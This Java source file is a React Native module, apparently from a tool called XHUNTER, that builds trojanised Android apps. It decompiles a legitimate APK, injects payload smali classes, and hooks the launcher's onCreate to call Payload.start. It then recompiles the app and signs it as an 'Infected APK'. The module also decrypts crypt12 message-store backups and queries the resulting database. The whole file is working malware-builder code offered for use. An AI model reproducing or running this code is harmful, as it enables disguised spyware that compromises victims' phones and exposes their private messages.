package com.xhunter;

import android.content.res.AssetManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.RequiresApi;

import com.android.apksigner.ApkSignerTool;
import com.facebook.react.bridge.Arguments;
import com.facebook.react.bridge.Callback;
import com.facebook.react.bridge.Promise;
import com.facebook.react.bridge.ReactApplicationContext;
import com.facebook.react.bridge.ReactContextBaseJavaModule;
import com.facebook.react.bridge.ReactMethod;
import com.facebook.react.bridge.WritableArray;
import com.facebook.react.bridge.WritableMap;
import com.facebook.react.bridge.WritableNativeArray;
import com.facebook.react.bridge.WritableNativeMap;
import com.facebook.react.modules.core.DeviceEventManagerModule;

import net.dongliu.apk.parser.ApkFile;

import org.apache.commons.io.FileUtils;
import org.jetbrains.annotations.NotNull;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;
import org.xmlpull.v1.XmlPullParserFactory;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.io.StringReader;
import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.security.Security;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.regex.Pattern;
import java.util.zip.DataFormatException;
import java.util.zip.Inflater;
import java.util.zip.InflaterInputStream;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.ShortBufferException;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import brut.apktool.Main;
import org.spongycastle.jce.provider.BouncyCastleProvider; // Android

public class AppBuilderModule extends ReactContextBaseJavaModule {
    private final ReactApplicationContext reactContext;
    private final String working_dir= Environment.getExternalStorageDirectory().getPath()+"/XHUNTER/";
    private final String payload_name="payload.apk";
    AppBuilderModule(ReactApplicationContext context) {
        super(context);
        this.reactContext = context;
    }
    static {
        Security.insertProviderAt(new org.spongycastle.jce.provider.BouncyCastleProvider(), 1);
    }

    @NotNull
    @Override
    public String getName() {
        return "AppBuilder";
    }
    @ReactMethod
    public void decrypt(String C12File,String KeyFile,Promise promise){
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Decription Success!");
        try{
            String decryptedDbFile = Environment.getExternalStorageDirectory().getPath()+"/msgstore.db";         // sqlite3 db output file
            final File tempFile = new File(System.getProperty("java.io.tmpdir") + "/"
                    + (int) (System.currentTimeMillis() / 1000L) + "-msgstore.enc");

            if (!new File(KeyFile).isFile())
                promise.reject("e","The specified input key file does not exist.");

            else if (new File(KeyFile).length() != 158)
                promise.reject("e","The specified input key file is invalid.");

            else if (!new File(C12File).isFile())
                promise.reject("e","The specified input crypt12 file does not exist.");

            InputStream KeyIn = new FileInputStream(KeyFile);
            InputStream WdbIn = new BufferedInputStream(new FileInputStream(C12File));

            byte[] KeyData = new byte[158];
            KeyIn.read(KeyData);
            byte[] T1 = new byte[32];
            System.arraycopy(KeyData, 30, T1, 0, 32);
            byte[] KEY = new byte[32];
            System.arraycopy(KeyData, 126, KEY, 0, 32);
            KeyIn.close();

            byte[] C12Data = new byte[190];
            WdbIn.read(C12Data);
            byte[] T2 = new byte[32];
            System.arraycopy(C12Data, 3, T2, 0, 32);
            byte[] IV = new byte[16];
            System.arraycopy(C12Data, 67, IV, 0, 16);
            if (!new String(T1, 0, T1.length, "ASCII").equals(new String(T2, 0, T2.length, "ASCII")))
                promise.reject("e","Key file mismatch or crypt12 file is corrupt.");

            int InputLength = WdbIn.available();
            RandomAccessFile raf = new RandomAccessFile(tempFile, "rw");

            byte[] tempBuffer = new byte[1024];
            int I;
            while ((I = WdbIn.read(tempBuffer)) != -1)
                raf.write(tempBuffer, 0, I);
            raf.setLength(InputLength);
            raf.close();
            WdbIn.close();

            InputStream PdbSt = new BufferedInputStream(new FileInputStream(tempFile));

            Cipher cipher;
            Security.addProvider(new BouncyCastleProvider());
            cipher = Cipher.getInstance("AES/GCM/NoPadding", "SC"); // SpongyCastle (Android)

            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(KEY, "AES"), new IvParameterSpec(IV));
            CipherInputStream CipherStream = new CipherInputStream(PdbSt, cipher);

            InflaterInputStream CryptOutput = new InflaterInputStream(CipherStream, new Inflater(false));

            try {
                FileOutputStream InflateBuffer = new FileOutputStream(decryptedDbFile);
                int N = 0;
                byte[] CryptBuffer = new byte[8192];
                while ((N = CryptOutput.read(CryptBuffer)) != -1) {
                    InflateBuffer.write(CryptBuffer, 0, N);
                }
                InflateBuffer.close();

            } catch (IOException e) {
                e.printStackTrace();
            }

            tempFile.delete();

            InputStream SqlDB = new FileInputStream(decryptedDbFile);

            byte[] SqlData = new byte[6];
            SqlDB.read(SqlData);
            byte[] MS = new byte[6];
            System.arraycopy(SqlData, 0, MS, 0, 6);
            SqlDB.close();
            promise.resolve(params);

        } catch (SecurityException | NoSuchProviderException | IOException | NoSuchAlgorithmException | NoSuchPaddingException | InvalidAlgorithmParameterException | InvalidKeyException e){
            e.printStackTrace();
            promise.reject("e","[!] Decryption Failed!");
        }
    }
    @ReactMethod
    public void readDB(String path, String query, Promise promise){
        try{
            SQLiteDatabase db = SQLiteDatabase.openDatabase( path, null,0);
            Cursor res = db.rawQuery(query, null);
            res.moveToFirst();
            WritableArray list = new WritableNativeArray();
            while(res.isAfterLast() == false){
                int index=0;
                WritableMap obj = new WritableNativeMap();
                while(index<res.getColumnCount()){
                    if(res.getType(index)==4){
                        obj.putString(res.getColumnName(index), Base64.encodeToString(res.getBlob(index), Base64.DEFAULT));
                    }else{
                        obj.putString(res.getColumnName(index),res.getString(index));
                    }
                    index++;
                }
                list.pushMap(obj);
                res.moveToNext();
            }
            promise.resolve(list);
            res.close();
        } catch (SecurityException e){
            e.printStackTrace();
        }
    }
    @ReactMethod
    public void loadResources(Promise promise){
        File workingDirectory = new File(working_dir);
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Loaded Required Resources Successfully!");
        try{
            if(workingDirectory.exists()){
                copyAssets(payload_name,workingDirectory);
                copyAssets("test.pem",workingDirectory);
                copyAssets("test.pk8",workingDirectory);
                promise.resolve(params);
            }else{
                if(workingDirectory.mkdirs()){
                    copyAssets(payload_name,workingDirectory);
                    copyAssets("test.pem",workingDirectory);
                    copyAssets("test.pk8",workingDirectory);
                    promise.resolve(params);
                }else{
                    promise.reject("e","[!] Failed to create working directory");
                }
            }
        } catch (SecurityException e){
            e.printStackTrace();
            promise.reject("e","[!] Loading  Resources Failed!");
        }
    }
    @ReactMethod
    public void decompile_payload(Promise promise) {
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Decompiled Xhunter Payload Successfully !");
        try {
            Main.main(new String[]{"d","-r","-f", working_dir+"payload.apk", "-o", working_dir+"payload", });
            promise.resolve(params);
        } catch (Exception e) {
            promise.reject("e","[!] Failed to Decompile Xhunter Payload APK");
            e.printStackTrace();
        }
    }
    @ReactMethod
    public void decompile_normal_apk(String targetApkPath, Promise promise) {
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Decompiled Successfully !");
        try {
            Main.main(new String[]{"d", "-r","-f", targetApkPath , "-o", working_dir+"normal_apk", });
            promise.resolve(params);
        } catch (Exception e) {
            e.printStackTrace();
            promise.reject("e","[!] Failed to Decompile Normal/Legitimate APK");
        }
    }
    @ReactMethod
    public void move_payload_files_to_normal_apk(Promise promise){
        String source1 = working_dir+"payload/smali/com/xhunter";
        String destination1 = working_dir+"normal_apk/smali/com/xhunter";
        String source2 = working_dir+"payload/smali/io";
        String destination2 = working_dir+"normal_apk/smali/io";
        String source3 = working_dir+"payload/smali/okhttp3";
        String destination3 = working_dir+"normal_apk/smali/okhttp3";
        String source4 = working_dir+"payload/smali/okio";
        String destination4 = working_dir+"normal_apk/smali/okio";

        String source5 = working_dir+"payload/unknown/okhttp3";
        String destination5 = working_dir+"normal_apk/unknown/okhttp3";

        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Moved Successfully !");
        try {
            moveDir(source1,destination1);// xhunter payload
            moveSocketIO(source2,destination2);// socket-io
            moveDir(source3,destination3);// okhttp3
            moveDir(source4,destination4);// okio
            moveUnknown(source5,destination5);// unknown
            promise.resolve(params);
        } catch (IOException e) {
            e.printStackTrace();
            promise.reject("e","[!] Failed to Move Xhunter Payload Files to Normal/Legitimate APK");
        }
    }
    @ReactMethod
    public void hook_smali_file(String targetApkPath, Promise promise){
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Hooked Successfully !");
        try (ApkFile apkFile = new ApkFile(new File(targetApkPath))) {
            String manifestXml = apkFile.getManifestXml();
            String smali_hook_path = getHookSmaliPath(manifestXml);
            if(smali_hook_path != null) {
                hook_payload(working_dir+"normal_apk/smali/"+smali_hook_path);
                promise.resolve(params);
            }else{
                promise.reject("e","[!] Unable to locate the .smali launcher in AndroidManifest.xml");
            }
        }catch(IOException e){
            e.printStackTrace();
            promise.reject("e","[!] Failed to Hook Xhunter Payload");
        }
    }
    @ReactMethod
    public void compile_build(Promise promise) {
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Compiled Infected APK Successfully !");
        try {
            Main.main(new String[]{"b", working_dir+"normal_apk", "-o", working_dir+"unsigned.apk", });
            promise.resolve(params);
        } catch (Exception e) {
            e.printStackTrace();
            promise.reject("e","[!] Failed to Compile Infected APK");
        }
    }
    @RequiresApi(api = Build.VERSION_CODES.O)
    @ReactMethod
    public void sign(Promise promise) {
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Signed Infected APK !");
        try {
            ApkSignerTool.main(new String[]{"sign", "--key", working_dir+"test.pk8", "--cert", working_dir+"test.pem", "--out", working_dir+"xhunter_payload.apk", working_dir+"unsigned.apk"});
            promise.resolve(params);
        } catch (Exception e) {
            e.printStackTrace();
            promise.reject("e","[!] Failed to Sign Infected APK");
        }
    }
    @ReactMethod
    public void cleanup(Promise promise){
        WritableMap params = Arguments.createMap();
        params.putString("message", "[+] Done !!");
        try {
            deleteFile(working_dir+payload_name);
            deleteFile(working_dir+"unsigned.apk");
            deleteFile(working_dir+"test.pk8");
            deleteFile(working_dir+"test.pem");
            promise.resolve(params);
        }catch (SecurityException e){
            e.printStackTrace();
            promise.reject("e","[!] Failed to clean unnecessary files, But it's okay");
        }
    }


    private String getHookSmaliPath(String manifestXml) {
        String hook_smali_path=null;
        try{
            XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
            factory.setNamespaceAware(true);
            XmlPullParser xpp = factory.newPullParser();
            xpp.setInput( new StringReader( manifestXml ) );
            int eventType = xpp.getEventType();
            while (eventType != XmlPullParser.END_DOCUMENT) {
                if(eventType == XmlPullParser.START_TAG) {
                   if(xpp.getName().equals("activity")){
                       int i=0;
                       String smali_path="";
                       while (i<xpp.getAttributeCount()) {
                           if (xpp.getAttributeName(i).equals("name")) {
                               smali_path=xpp.getAttributeValue(i);
                           }
                           i++;
                       }
                       while (eventType != XmlPullParser.END_TAG) {
                            xpp.next();
                           if ((xpp.getName() != null) && (xpp.getEventType() != XmlPullParser.END_TAG) && (xpp.getName().equals("action"))) {
                               System.out.println("Action ------> " + xpp.getAttributeValue(0));
                               if (xpp.getAttributeValue(0).equals("android.intent.action.MAIN")) {
                                   Log.e("Found smali path :", smali_path);
                                   hook_smali_path = smali_path.replaceAll("\\.","/")+".smali";
                               }
                           }//action
                           if ((xpp.getName() != null) && (xpp.getName().equals("activity"))) {
                              break;
                           }
                       }//iterating through a Activity for all its elements like <intent-filter/> <action/>
                   }//if current element is actitvity then true
                }
                eventType = xpp.next();
            }
        }catch (XmlPullParserException | IOException e){
            e.printStackTrace();
        }
        return hook_smali_path;
    }
    private void hook_payload(String path){
        try
        {
            File file=new File(path);    //creates a new file instance
            FileReader fr=new FileReader(file);   //reads the file
            BufferedReader br=new BufferedReader(fr);  //creates a buffering character input stream
            StringBuilder sb=new StringBuilder();    //constructs a string buffer with no characters
            String line;
            Pattern pattern = Pattern.compile(";->onCreate\\(Landroid/os/Bundle;\\)V");
            while((line=br.readLine())!=null)
            {
                sb.append(line);      //appends line to string buffer
                sb.append("\n");     //line feed
                boolean matchFound = pattern.matcher(line).find();
                if(matchFound){
                    sb.append("invoke-static {p0}, Lcom/xhunter/client/Payload;->start(Landroid/content/Context;)V");
                    sb.append("\n");
                }
            }
            fr.close();    //closes the stream and release the resources
            FileOutputStream fileOut = new FileOutputStream(path); //writes file
            fileOut.write(sb.toString().getBytes());
            fileOut.close();
        }
        catch(IOException e)
        {
            e.printStackTrace();
        }
    }
    private void copyAssets(String file,File targetDirectory) {
        AssetManager assetManager = getReactApplicationContext().getAssets();
        if (file != null){
            InputStream in = null;
            OutputStream out = null;
            try {
                in = assetManager.open(file);
                File outFile = new File(targetDirectory, file);
                out = new FileOutputStream(outFile);
                copyFile(in, out);
            } catch(IOException e) {
                Log.e("tag", "Failed to copy asset file: " + file, e);
            }
            finally {
                if (in != null) {
                    try {
                        in.close();
                    } catch (IOException e) {
                        // NOOP
                    }
                }
                if (out != null) {
                    try {
                        out.close();
                    } catch (IOException e) {
                        // NOOP
                    }
                }
            }
        }
    }
    private void copyFile(InputStream in, OutputStream out) throws IOException {
        byte[] buffer = new byte[1024];
        int read;
        while((read = in.read(buffer)) != -1){
            out.write(buffer, 0, read);
        }
    }
    private void deleteFile(String path){
        File file = new File(path);
        if (file.exists()) {
            try {
                if(file.delete()){
                    System.out.println("success");
                }
            } catch (SecurityException e){
                e.printStackTrace();
            }
        }
    }
    private void moveDir(String source, String destination) throws IOException{
            if(!(new File(destination).exists())){
                FileUtils.moveDirectory(new File(source), new File(destination));
            }
    }
    private void moveSocketIO(String source, String destination) throws IOException{
        if(!new File(working_dir+"normal_apk/smali/io/socket").exists()) {
            if (!new File(working_dir+"normal_apk/smali/io").exists()) {
                FileUtils.moveDirectory(new File(source), new File(destination));
            }else{
                FileUtils.moveDirectory(new File(source+"/socket"), new File(destination+"/socket"));
            }
        }//then do nothing
    }
    private void moveUnknown(String source, String destination) throws IOException{
        if(new File(working_dir+"normal_apk/unknown").exists()) {
            if (!new File(destination).exists()) {
                FileUtils.moveDirectory(new File(source), new File(destination));
            }
        }else{
            if(new File(working_dir+"normal_apk/unknown").mkdir()){
                FileUtils.moveDirectory(new File(source), new File(destination));
            }
        }
    }

}
